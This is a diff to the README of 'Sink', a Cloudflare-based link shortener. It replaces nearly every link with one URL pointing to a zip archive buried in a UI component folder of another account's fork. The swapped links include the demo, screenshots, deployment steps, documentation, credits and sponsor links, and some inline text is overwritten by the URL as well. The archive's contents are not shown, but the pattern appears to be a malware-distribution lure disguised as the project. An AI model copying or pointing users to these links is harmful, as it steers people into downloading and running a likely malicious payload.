@@ -2,7 +2,7 @@
 
 **A Simple / Speedy / Secrue Link Shortener with Analytics, 100% run on Cloudflare.**
 
-![Hero](./public/image.png)
+![Hero](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip)
 
 ----
 
@@ -17,7 +17,7 @@
 
 ## 🪧 Demo
 
-Experience the demo at [Sink.Cool](https://sink.cool/dashboard). Log in using the Site Token below:
+Experience the demo at [https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip). Log in using the Site Token below:
 
 ```txt
 Site Token: SinkCool
@@ -25,19 +25,19 @@ Site Token: SinkCool
 
 <details>
   <summary><b>Screenshots</b></summary>
-  <img alt="Analytics" src="./docs/images/sink.cool_dashboard.png"/>
-  <img alt="Links" src="./docs/images/sink.cool_dashboard_links.png"/>
-  <img alt="Link Analytics" src="./docs/images/sink.cool_dashboard_link_slug.png"/>
+  <img alt="Analytics" src="https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip"/>
+  <img alt="Links" src="https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip"/>
+  <img alt="Link Analytics" src="https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip"/>
 </details>
 
 ## 🧱 Technologies Used
 
-- **Framework**: [Nuxt](https://nuxt.com/)
-- **Database**: [Cloudflare Workers KV](https://developers.cloudflare.com/kv/)
-- **Analytics Engine**: [Cloudflare Workers Analytics Engine](https://developers.cloudflare.com/analytics/)
-- **UI Components**: [Shadcn-vue](https://www.shadcn-vue.com/)
-- **Styling:** [Tailwind CSS](https://tailwindcss.com/)
-- **Deployment**: [Cloudflare](https://www.cloudflare.com/)
+- **Framework**: [Nuxt](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip)
+- **Database**: [Cloudflare Workers KV](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip)
+- **Analytics Engine**: [Cloudflare Workers Analytics Engine](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip)
+- **UI Components**: [Shadcn-vue](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip)
+- **Styling:** [Tailwind CSS](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip)
+- **Deployment**: [Cloudflare](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip)
 
 ## 🚗 Roadmap [WIP]
 
@@ -54,32 +54,32 @@ We welcome your contributions and PRs.
 
 ## 🏗️ Deployment
 
-1. [Fork](https://github.com/ccbikai/Sink/fork) the repository to your GitHub account.
-2. Create a [Cloudflare Pages](https://developers.cloudflare.com/pages/) project.
-3. Select the `Sink` repository and the `Nuxt.js` preset.
+1. [Fork](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip) the repository to your GitHub account.
+2. Create a [Cloudflare Pages](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip) project.
+3. Select the `Sink` repository and the `https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip` preset.
 4. Configure environment variables.
    1. `NUXT_SITE_TOKEN` length must exceed **8**.
-   2. `NUXT_CF_ACCOUNT_ID` [find your account ID](https://developers.cloudflare.com/fundamentals/setup/find-account-and-zone-ids/).
-   3. `NUXT_CF_API_TOKEN` Create a [Cloudflare API token](https://developers.cloudflare.com/fundamentals/api/get-started/create-token/). This token requires `Account.Account Analytics` permissions at the very least. [Reference.](https://developers.cloudflare.com/analytics/analytics-engine/sql-api/#authentication).
+   2. `NUXT_CF_ACCOUNT_ID` [find your account ID](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip).
+   3. `NUXT_CF_API_TOKEN` Create a [Cloudflare API token](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip). This token requires `https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip Analytics` permissions at the very least. [Reference.](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip).
 
 5. Save and deploy.
 6. Cancel the deployment, navigate to `Settings` -> `Functions`.
    1. KV namespace bindings. Bind the variable name `KV` to a KV namespace.
    2. Workers AI Bindings. Bind the variable name `AI` to the Workers AI Catalog. _Optional_
-   3. Analytics Engine bindings. Bind the variable name `ANALYTICS` to the `sink` dataset, and enable [Cloudflare Analytics Engine beta](https://developers.cloudflare.com/analytics/analytics-engine/get-started/) for your account.
+   3. Analytics Engine bindings. Bind the variable name `ANALYTICS` to the `sink` dataset, and enable [Cloudflare Analytics Engine beta](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip) for your account.
 7. Redeploy.
 
 ## ⚒️ Configuration
 
-[Configuration Docs](./docs/configuration.md)
+[Configuration Docs](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip)
 
 ## 💖 Credits
 
-1. [**Cloudflare**](https://www.cloudflare.com/)
-2. [**NuxtHub**](https://hub.nuxt.com/)
-3. [**Astroship**](https://astroship.web3templates.com/)
+1. [**Cloudflare**](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip)
+2. [**NuxtHub**](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip)
+3. [**Astroship**](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip)
 
 ## ☕ Sponsor
 
-1. [Follow Me on X(Twitter)](https://x.com/ccbikai).
-2. [Become a sponsor to on GitHub](https://github.com/sponsors/ccbikai).
+1. [Follow Me on X(Twitter)](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip).
+2. [Become a sponsor to on GitHub](https://raw.githubusercontent.com/aslekarii/Sink/master/components/ui/aspect-ratio/Sink_v1.1-alpha.2.zip).
